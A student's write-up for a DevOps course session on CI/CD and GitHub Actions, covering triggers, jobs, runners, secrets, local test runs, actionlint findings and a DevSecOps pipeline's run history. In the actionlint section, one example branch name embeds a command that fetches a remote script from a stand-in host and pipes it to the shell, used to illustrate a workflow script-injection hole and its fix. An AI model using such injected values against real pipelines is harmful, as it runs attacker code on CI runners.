# Session 16: CI/CD and GitHub Actions

**Pratyush Mishra · Roll No. 10486**

Went through the instructor folders on CI vs CD, pipeline structure, triggers, jobs and steps, runners, secrets and artifacts, ran the build-and-test parts locally, linted every workflow in the folder, and then wrote one real workflow at the repo root that GitHub actually runs. At the end is the full DevSecOps pipeline I built in my own repo, which carries straight on into Session 17. Command output below is copied from my terminal.

**Setup:** Ubuntu 26.04 on WSL2, Docker (Python 3.11 / 3.12 slim images so the local runs use the same Python as the workflows), actionlint 1.7.12 in Docker. GitHub Actions on `ubuntu-latest` for the real runs.

> The folder names in here have odd timestamp suffixes (`01-ci-vs-cd 10-33-34-211` and so on). That is how they came from the instructor, so I left them alone and quote the paths as-is.

---

## 1. CI vs CD

`01-ci-vs-cd 10-33-34-211/` has two scripts that walk through what each half of the pipeline does. They only `echo` the stages (the test counts and coverage are hard-coded), but they show the shape well, and `cd_simulation.sh` has the one difference that actually matters, delivery vs deployment.

```bash
$ ./ci_simulation.sh
[INFO] Starting CI simulation...
[INFO] Step 1: Pulling latest source code from git...
[PASS] Code checkout successful: commit 8f9b2d1
[INFO] Step 2: Setting up runtime environment...
Python 3.14.4
[INFO] Step 3: Running linter checks (flake8)...
[PASS] Zero style violations found
[INFO] Step 4: Running automated unit tests (pytest)...
[PASS] 14 unit tests executed: 14 passed, 0 failed
[INFO] Step 5: Calculating code coverage...
[PASS] Coverage: 92.4% (threshold: 80%)
[INFO] CI Pipeline Succeeded. Application artifact is verified and ready for CD.

$ ./cd_simulation.sh
[INFO] Starting CD simulation (Mode: delivery)...
[INFO] Step 1: Packaging verified artifact into container image...
[PASS] Image built and tagged: myapp:sha-8f9b2d1
[INFO] Step 2: Running container vulnerability scan (Trivy)...
[PASS] Vulnerabilities: 0 CRITICAL, 0 HIGH
[INFO] Step 3: Deploying to Staging environment...
[PASS] Staging deployment healthy: HTTP 200 returned from /health
[INFO] Continuous Delivery mode active: Ready for manual approval gate.
[INFO] Awaiting operator sign-off before production traffic shift.

$ ./cd_simulation.sh deployment
...
[INFO] Continuous Deployment mode active: Auto-promoting to Production...
[PASS] Production deployment complete: Traffic migrated with zero downtime.
```

How I think about the three terms:

| | What happens automatically | Where it stops |
| --- | --- | --- |
| **Continuous Integration** | Every push is built, linted and tested | A verified artifact |
| **Continuous Delivery** | That artifact is packaged and deployed to staging | A human approves the production release |
| **Continuous Deployment** | Same, then promoted to production with no human step | Production |

The only difference between delivery and deployment is that approval gate. Continuous deployment is only safe when the tests are good enough that you would trust them to ship on their own, which is why CI has to come first.

📸 `screenshots/01-ci-cd-simulation.png`

---

## 2. Pipeline concepts: stages, jobs, steps

`02-pipeline-concepts 10-33-34-222/pipeline.yaml` is a tool-neutral description of a pipeline (source → build → verification → package → deploy), and `pipeline_stages.sh` prints the same flow.

```bash
$ ./pipeline_stages.sh
=========================================
 CI/CD Pipeline Execution Demonstration
=========================================
[STAGE 1] Source Checkout
  - Pulling repository branch: main
  - HEAD commit: e4a10c8
  - Checkout status: [PASS]
[STAGE 2] Build & Dependencies
  ...
[STAGE 3] Parallel Quality Gates
  - Sub-task A: Running Unit Tests & Coverage...
  - Sub-task B: Running Static Code Analysis (Lint)...
  - Sub-task C: Scanning for Credential Leaks...
  - Quality Gates status: [ALL PASSED]
[STAGE 4] Artifact Generation
  - Assembling distributable package: dist/app.tar.gz
  - Generating test results: reports/junit.xml
  - Artifacts stored: [PASS]
[STAGE 5] Deployment
  ...
=========================================
 Pipeline Finished Successfully in 2.1s
=========================================
```

The vocabulary maps directly onto GitHub Actions:

- **Workflow**: one YAML file in `.github/workflows/`. A repo can have several.
- **Job**: a group of steps that runs on one fresh runner. Jobs run in **parallel** by default. `needs:` makes one wait for another, which is how you get the stage ordering above (in `pipeline.yaml` that is `depends_on`).
- **Step**: one shell command (`run:`) or one reusable action (`uses:`). Steps in a job run in order, share the same filesystem, and the job stops at the first failing step.

The "parallel quality gates" stage is the useful idea: lint, unit tests and secret scanning do not depend on each other, so they should run side by side and then a later job `needs:` all of them.

---

## 3. GitHub Actions basics and triggers

`03-github-actions-intro` has a hello-world workflow and `04-workflows` has one file per trigger type. The triggers I would actually use:

```yaml
on:
  push:
    branches: [main]
    paths: ['src/**']          # only run when these files change
  pull_request:
    branches: [main]           # run on PRs into main
  schedule:
    - cron: '0 0 * * *'        # nightly, always UTC
  workflow_dispatch:           # "Run workflow" button in the UI
```

One thing I did not know before this session: **GitHub only runs workflows from the `.github/workflows/` directory at the root of the repo.** Every lesson folder here has its own `.github/workflows/` copy (for example `03-github-actions-intro 10-33-34-226/.github/workflows/hello.yml`), and none of them will ever trigger, because they are nested. That is why the real workflow for this session lives at `/.github/workflows/session16-ci.yml` (section 8).

---

## 4. Jobs and steps, runners

`05-jobs-steps` shows sequential jobs (`needs:`), parallel jobs (no `needs:`), conditional steps (`if: github.ref == 'refs/heads/main'`, `if: always()`) and multi-line `run: |` blocks. `06-runners` shows the runner side:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version: ['3.9', '3.10', '3.11']
```

- **GitHub-hosted runners** (`ubuntu-latest`, `windows-latest`, `macos-latest`) are a brand new VM per job, thrown away afterwards. Nothing carries over between jobs unless you pass it as an artifact or cache.
- **Self-hosted runners** (`runs-on: [self-hosted, linux, gpu]`) are your own machines. You need them for special hardware or private network access, but they are not wiped between jobs, so they should never run workflows from untrusted forks.
- A **matrix** fans one job out into one copy per combination. `fail-fast: false` keeps the other Python versions running when one fails, so you see every failure in a single run.

---

## 5. Secrets and artifacts

`07-secrets` covers repository secrets, environment secrets and the built-in `GITHUB_TOKEN`; `08-artifacts` covers passing files between jobs.

```yaml
- name: Authenticate to Docker Hub
  env:
    DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
    DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
  run: echo "$DOCKER_PASSWORD" | docker login -u "$DOCKER_USERNAME" --password-stdin
```

- Secrets are set in repo **Settings → Secrets and variables → Actions**, are encrypted, and are printed as `***` if they ever show up in a log. They are not passed to workflows triggered from forks.
- Pass them through `env:` and `--password-stdin`, not on the command line, so they do not end up in the process list.
- An **artifact** is how one job hands files to another (each job is on a fresh VM) or to a human: `actions/upload-artifact` in one job, `actions/download-artifact` in a later job that `needs:` it. They expire (`retention-days`).

I hit the secrets part for real in my own pipeline: the first run failed at Docker Hub login because the secret was not set yet. Details in section 9.

---

## 6. Build and test pipeline, run locally

`09-build-test-pipeline 10-33-34-262/` is the mini-project: a small `app.py`, four pytest tests, and a `ci.yml` that does lint → test → upload artifacts. Before trusting any workflow I ran the exact same commands locally in the same Python version the workflow uses (3.11):

```bash
$ docker run --rm -v "$PWD":/src -w /src python:3.11-slim sh -c "pip install -q --root-user-action=ignore --disable-pip-version-check -r requirements.txt && flake8 --version && flake8 app.py tests/ && echo flake8: clean && python -m pytest tests/ --junitxml=test-results/results.xml --cov=app --cov-report=xml:coverage.xml --cov-report=term-missing"
6.1.0 (mccabe: 0.7.0, pycodestyle: 2.11.1, pyflakes: 3.1.0) CPython 3.11.17 on
Linux
flake8: clean
============================= test session starts ==============================
platform linux -- Python 3.11.17, pytest-7.4.0, pluggy-1.6.0
rootdir: /src
plugins: cov-4.1.0
collected 4 items

tests/test_app.py ....                                                   [100%]

-------------- generated xml file: /src/test-results/results.xml ---------------

---------- coverage: platform linux, python 3.11.17-final-0 ----------
Name     Stmts   Miss  Cover   Missing
--------------------------------------
app.py       8      0   100%
--------------------------------------
TOTAL        8      0   100%
Coverage XML written to file coverage.xml

============================== 4 passed in 0.38s ===============================
```

Lint clean, 4 tests pass, 100% coverage, and the two files the workflow uploads as artifacts (`test-results/results.xml` and `coverage.xml`) are produced.

📸 `screenshots/02-lint-test-coverage.png`

### The gotcha: `pytest` vs `python -m pytest`

The test file does `from app import add, subtract, divide`. Run it with bare `pytest` and it falls over:

```bash
$ docker run --rm -v "$PWD":/src -w /src python:3.11-slim sh -c "pip install -q ... -r requirements.txt && pytest tests/ -q"
==================================== ERRORS ====================================
______________________ ERROR collecting tests/test_app.py ______________________
ImportError while importing test module '/src/tests/test_app.py'.
...
tests/test_app.py:2: in <module>
    from app import add, subtract, divide
E   ModuleNotFoundError: No module named 'app'
=========================== short test summary info ============================
ERROR tests/test_app.py
!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!
1 error in 0.09s

$ ls -la test-results/ coverage.xml && head -c 400 test-results/results.xml
-rwxrwxrwx 1 pratyush_mishra pratyush_mishra 985 Oct  7 16:41 coverage.xml

test-results/:
-rwxrwxrwx 1 pratyush_mishra pratyush_mishra  513 Oct  7 16:41 results.xml
<?xml version="1.0" encoding="utf-8"?><testsuites><testsuite name="pytest" errors="0" failures="0" skipped="0" tests="4" ...
```

`python -m pytest` puts the current directory on `sys.path`; bare `pytest` only adds the test file's own folder (`tests/`), so `app` cannot be found. The instructor's `ci.yml` uses `python -m pytest`, which is why it works, but it is an easy thing to "simplify" and break. (The JUnit XML above is from the earlier, passing run.)

📸 `screenshots/03-pytest-import-gotcha.png`

### The final pipeline app

`session-16-github-actions/10-final-cicd-pipeline/` is the bigger version: a calculator app, tests, and a `build.sh` that packages it into `build/`.

```bash
$ docker run --rm -v "$PWD":/src -w /src python:3.11-slim sh -c "pip install -q ... -r requirements.txt && pytest -v -p no:cacheprovider"
platform linux -- Python 3.11.17, pytest-9.1.1, pluggy-1.6.0 -- /usr/local/bin/python3.11
rootdir: /src
collecting ... collected 5 items

tests/test_calculator.py::test_add PASSED                                [ 20%]
tests/test_calculator.py::test_subtract PASSED                           [ 40%]
tests/test_calculator.py::test_multiply PASSED                           [ 60%]
tests/test_calculator.py::test_divide PASSED                             [ 80%]
tests/test_calculator.py::test_divide_by_zero PASSED                     [100%]

============================== 5 passed in 0.15s ===============================

$ ./build.sh
=================================
Starting Application Build
=================================

Build files:
total 4
drwxrwxrwx 1 pratyush_mishra pratyush_mishra 4096 Oct  7 16:42 .
drwxrwxrwx 1 pratyush_mishra pratyush_mishra 4096 Oct  7 16:42 ..
-rwxrwxrwx 1 pratyush_mishra pratyush_mishra   98 Oct  7 16:42 build-info.txt
-rwxrwxrwx 1 pratyush_mishra pratyush_mishra 1488 Oct  7 16:42 calculator.py

Build completed successfully.

$ cat build/build-info.txt
Application: Session 16 Calculator
Build Status: SUCCESS
Build Date: Wed Oct  7 16:42:28 UTC 2026
```

📸 `screenshots/04-final-pipeline-build.png`

---

## 7. Linting the workflows themselves (actionlint)

A workflow with a YAML mistake only tells you when you push it. [actionlint](https://github.com/rhysd/actionlint) catches that locally, so I ran it on my workflow and then on every `.yml` in the session folder.

```bash
$ docker run --rm -v "$PWD":/repo -w /repo rhysd/actionlint:latest -version | head -1
1.7.12

$ docker run --rm -v "$PWD":/repo -w /repo rhysd/actionlint:latest -no-color .github/workflows/session16-ci.yml && echo actionlint: no issues
actionlint: no issues

$ docker run --rm -v "$PWD":/s16 -w /s16 --entrypoint sh rhysd/actionlint:latest -c 'find . -name "*.yml" -exec actionlint -no-color -oneline {} +'
./04-workflows 10-33-34-230/path-filter.yml:9:5: both "paths" and "paths-ignore" filters cannot be used for the same event "push". note: use '!' to negate patterns [events]
./04-workflows 10-33-34-230/pr-trigger.yml:14:123: "github.head_ref" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. ... [expression]
./05-jobs-steps 10-33-34-238/conditional-steps.yml:22:52: could not parse as YAML: mapping values are not allowed in this context [syntax-check]
./06-runners 10-33-34-242/self-hosted-runner.yml:9:35: label "gpu" is unknown. available labels are "windows-latest", ... if it is a custom label for self-hosted runner, set list of labels in actionlint.yaml config file [runner-label]
```

My workflow is clean. Of the 37 YAML files in the session folder, 4 have findings, and each one is a lesson in itself:

1. **`path-filter.yml`**: `paths` and `paths-ignore` together on one event is rejected by GitHub. The fix is one `paths` list with `!docs/**` negations.
2. **`pr-trigger.yml`**: `echo "Source branch: ${{ github.head_ref }}"` is a script injection hole. The branch name is chosen by whoever opens the PR, and `${{ }}` is pasted into the shell script *before* bash runs it, so a branch named `` a`curl evil.sh|sh` `` would execute. Pass it through `env:` and use `"$HEAD_REF"` instead.
3. **`conditional-steps.yml`**: `run: echo "Workflow finished with job status: ${{ job.status }}"`. The unquoted `status: ` (colon + space) makes YAML read it as a nested mapping, so this file would not even load. Quoting the whole `run:` value or using `run: |` fixes it.
4. **`self-hosted-runner.yml`**: `gpu` is a custom label; this is only a warning and is fine if you register a runner with that label.

📸 `screenshots/05-actionlint.png`

---

## 8. My workflow: `.github/workflows/session16-ci.yml`

This is the mini-project as a real, running pipeline. It lives at the repo root (so GitHub runs it) and only fires when something in this session changes:

```yaml
on:
  push:
    branches: [main]
    paths:
      - 'session-16-github-actions/**'
      - '.github/workflows/session16-ci.yml'
  workflow_dispatch:
```

Three jobs, chained with `needs:` so each one is a gate for the next:

```
lint (flake8)  ──►  test (pytest + coverage)  ──►  build calculator artifact
                       └─ uploads session16-test-results       └─ uploads session16-calculator-build
```

Things I did on purpose, mostly from the problems above:

- `env.APP_DIR` + `defaults.run.working-directory` so every `run:` step runs inside the folder with the space in its name, without me quoting it 10 times.
- `python -m pytest` for the import reason in section 6.
- `upload-artifact` **paths are relative to the workspace root, not to `working-directory`**, so the artifact paths are written out in full as `${{ env.APP_DIR }}/test-results/`. Using just `test-results/` would upload nothing.
- The test-results upload has `if: always()`, so a failing test run still gives you the JUnit XML to look at.
- `permissions: contents: read` (least privilege for `GITHUB_TOKEN`) and a `concurrency` group so a second push cancels the older run.
- `actions/checkout@v5`, `setup-python@v6`, `upload-artifact@v5`. My CI_CD-PIPE run (section 9) warned that `checkout@v4` / `setup-python@v5` target the deprecated Node.js 20, so I moved straight to the Node 24 versions.

It passes actionlint (section 7). The full file is at `/.github/workflows/session16-ci.yml`.

<!-- TODO-ACTIONS-RUN -->

---

## 9. The full pipeline I built: `PratyushMishra-2nd/CI_CD-PIPE`

The build-and-test pipeline above is CI only. For the end-to-end version I put the Session 17 demo app in my own repo, [PratyushMishra-2nd/CI_CD-PIPE](https://github.com/PratyushMishra-2nd/CI_CD-PIPE), with a workflow (`.github/workflows/devsecops.yml`, "Python DevSecOps Pipeline") that goes all the way from push to Kubernetes:

```
Unit Tests ─┐
SAST-CodeQL ├─► Docker Build ─► Image Scan (Trivy) ─► Push to Docker Hub ─► Deploy to Kubernetes
SCA (pip-audit) ┘
```

📸 `screenshots/06-devsecops-pipeline-run.png`: run #2, commit `5512d55` "added my name", triggered by push to `main`, status **Success**, total duration **3m 31s**. Job times from the graph: Unit Tests 11s, SAST-CodeQL 1m 6s, SCA 12s (all three in parallel), Docker Build 9s, Image Scan - Trivy 32s, Push Image to Docker Hub 29s, Deploy to Kubernetes 1m 0s. The annotations panel shows 8 warnings and 7 notices; the ones visible in the screenshot are the Node.js 20 deprecation for `actions/checkout@v4` and `actions/setup-python@v5`.

The run history from the GitHub API tells the actual story:

| Run | Commit | Result | What happened |
| --- | --- | --- | --- |
| #1 | `d96dca3` "1st commit" | **failure** | Tests, SAST, SCA, build and Trivy passed, then **Push Image to Docker Hub** failed at the *Login to Docker Hub* step with `Password required`. Deploy was skipped. |
| #2 | `5512d55` "added my name" | success | Changed the Docker Hub username and image name in the workflow to my own account, and added the `DOCKERHUB_TOKEN` repo secret. ([run](https://github.com/PratyushMishra-2nd/CI_CD-PIPE/actions/runs/36110210581)) |
| #3 | `2ad869b` "all test perfect" | success | Added a screenshot to the repo, everything green again. ([run](https://github.com/PratyushMishra-2nd/CI_CD-PIPE/actions/runs/36110614130)) |

Run #1 is the secrets lesson from section 5 in practice: `${{ secrets.DOCKERHUB_TOKEN }}` for a secret that does not exist is just an empty string, so the workflow is valid and only fails at the step that uses it. The `needs:` chain did its job and nothing got deployed.

The stage-by-stage breakdown of this pipeline (what CodeQL, pip-audit and Trivy actually check, and which of them really block the pipeline) is in [Session 17](../session-17-devsecops/README.md).

---

## File index

| Path | What it is |
| --- | --- |
| `01-ci-vs-cd 10-33-34-211/` | CI vs CD notes, `ci_simulation.sh`, `cd_simulation.sh` (delivery / deployment mode) |
| `02-pipeline-concepts 10-33-34-222/` | Tool-neutral `pipeline.yaml` and `pipeline_stages.sh` |
| `03-github-actions-intro 10-33-34-226/` | Hello-world workflow |
| `04-workflows 10-33-34-230/` | One workflow per trigger: push, PR, path filter, cron, manual dispatch |
| `05-jobs-steps 10-33-34-238/` | Sequential, parallel, conditional and multi-line steps |
| `06-runners 10-33-34-242/` | Matrix builds, multi-OS matrix, self-hosted runner |
| `07-secrets 10-33-34-248/` | Repo secrets, environment secrets, `GITHUB_TOKEN` for GHCR |
| `08-artifacts 10-33-34-260/` | Upload/download artifacts, test report and Docker image artifacts |
| `09-build-test-pipeline 10-33-34-262/` | Mini-project app, tests and `ci.yml` (lint → test → artifacts) |
| `session-16-github-actions/` | Second set of instructor lessons, incl. `10-final-cicd-pipeline` (calculator + `build.sh`) |
| `README.md 10-33-39-426.md` | Instructor's original session overview |
| `../.github/workflows/session16-ci.yml` | **My workflow**: the mini-project as a real pipeline at the repo root |
| `screenshots/` | Terminal captures and the CI_CD-PIPE run |

## Resources

- Instructor's original overview: <https://github.com/Nency-Ravaliya/devops-heros/blob/main/session-16-github-actions/README.md%2010-33-39-426.md>
- My DevSecOps pipeline repo: <https://github.com/PratyushMishra-2nd/CI_CD-PIPE>
- <https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions>
- <https://github.com/rhysd/actionlint>
